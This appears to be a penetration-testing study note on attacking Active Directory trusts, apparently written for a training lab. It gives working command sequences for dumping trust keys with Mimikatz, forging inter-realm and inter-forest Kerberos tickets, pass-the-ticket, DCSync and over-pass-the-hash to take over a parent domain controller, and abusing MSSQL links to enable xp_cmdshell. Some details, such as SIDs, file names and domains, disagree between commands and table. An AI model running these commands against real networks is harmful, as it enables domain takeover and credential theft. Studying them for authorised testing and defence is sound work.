---
title: Cross Forest / Domain Attacks
category: Active Directory
order: 6
---

In this section we are going to abuse trusts between forests.

# Trust Key

Technically, when you use a trust, there is a communication between the domain controller of your domain and the domain controller of the target domain (or of an intermediary domain).

How communication is made varies depending of the protocol that is being used (which could be NTLM, Kerberos, etc), but in any case, the domain controllers needs to share a key to keep the communications secure. This key is known as the trust key and it's created when the trust is established.

When a trust is created, a trust account is created in the domain database as if it were an user (with the name finished in $). The trust key is then stored as if it was the password of the trust user (in the NT hash and Kerberos keys).

A trust ticket is a key which a DC of the other forest uses to decrypt the TGT presented by the attacker. That is the only check. We are going to execute a similar attack such as golden ticket but using the *trust ticket* instead of the _krbtgt_ hash.

To list the Trust tickets we can use mimikatz:

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```
## Child to Parent using Trust Tickets

We can escalate between domains using the trust tickets. An **inter-realm TGT** can be forged:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:sub.corp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:05749eb179dbf3d3445e0a49d6701578 /service:krbtgt /targe
t:corp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
```
* **Invoke-Mimikatz**

|                   **Parameter**                   |                 **Description**                |
|:-------------------------------------------------:|:----------------------------------------------:|
| /domain:sub.corp.local                            | Current Domain FQDN                            |
| /sid:S-1-5-21-268341927-4156873456-1784235843     | Current Domain SID                             |
| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of Enterprise Admins group (Parent Domain) |
| /rc4:05749eb179dbf3d3445e0a49d6701578             | RC4 of the trust key (parent$)                 |
| /user:Administrator                               | User to impersonate                            |
| /service:krbtgt                                   | Target service in the parent domain            |
| /target:corp.local                                | Parent Domain FQDN                             |
| /tiket:C:\Windows\Temp\trust_tkt.kirbi            | File to store the ticket                       |


Once we have the inter-realm TGT ticket forged we can ask for a TGS on the parent domain. We can ask a TGS for LDAP on the parent DC.

* asktgs.exe (kekeo_old)
```
.\asktgs.exe ./trust_tkt.kirbi LDAP/corp-dc.corp.local
```

* Rubeus.exe
```
.\Rubeus.exe asktgs /ticket:trust_tkt.kirbi /dc:corp-dc.corp.local /service:LDAP/corp-dc.corp.local /ptt
```

Finally we can inject in on the current session:

```powershell
.\Rubeus.exe ptt /ticket:LDAP.mcorp-dc.moneycorp.local.kirbi
```

And execute a DCSync attack and Over-Pass-The-Hash to fully control the DC of the parent domain:

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
.\Rubeus.exe asktgt /domain:corp.local /user:Administrator /rc4:71d04f9d50ceb1f64de7a09f23e6dc4c /dc:corp-dc.moneycorp.local /ptt
Enter-PSSession -ComputerName corp-dc.moneycorp.local
```

## Across Forest using Trust Tickets

An **inter-forest TGT** can be forged:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:cd3fb1b0b49c7a56d285fffdd1399231 /service:krbtgt /target:extcorp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
```

Now we can request a TGS for `cifs` service on the dc of the trusted forest.

```powershell
.\asktgs.exe c:\temp\trust_forest_tkt.kirbi CIFS/dc01.extcorp.local
```
And inject the ticket on the current session:

```powershell
.\kirbikator.exe lsa .\CIFS.dc01.extcorp.local.kirbi
```
> **Note**: We can not list all the file system of other forest. We can only list shared folders.

```
ls \\dc01.extcorp.local\share\
```
# Child to Parent using krbtgt hash

# Trust Abuse with MSSQL Server

MSSQL Servers are generally deployed in plenty windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to dabase roles.

A fantastic tool to abuse MSSQL is `PowerUpSQLl`: 

* [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
```powershell
Import-Module .\PowerUpSQL.psd1
```

> **Note**: Important! Write `Import-Module` and import which have **PSD1** extension.

We can discover SQL servers:

```powershell
Get-SQLInstanceDomain
```

We can check accessibility:

```powershell
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
Gather information:

```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

## Database Links

A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of databases links between Microsoft SQL Servers, it is possible to execute stored procedures which means RCE.

Database link works even across forest trusts.

```powershell
Get-SQLServerLink -Instance mssql.corp.local -Verbose
```

So we can execute queries on the remote Server Link, see if this server has others links and above, instead of doing it manually that will be explained in a note, exists a script that crawls all the mssql server links.

```powershell
Get-SQLServerLinkCrawl -Instance mssql.corp.local -Verbose
```

> **Note**: Manual way:
>
> See if has a server link:
> `select * from master..sysservers`
>
> Openquery() function can be used to run quieries on a linked database:
> `select * from openquery('sql2.corp.local', 'select * from master..sysservers')`

To execute commands from MSSQL server we need to use `xp_cmdshell`. If `rpcout` is enabled `xp_cmdshell` can be enabled using:

```
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "other-sql"
```

And finally:

```powershell
Get-SQLServerLinkCrawl -Instance mssql.corp.local -Query "exec master..xp_cmdshell 'whoami'"
```

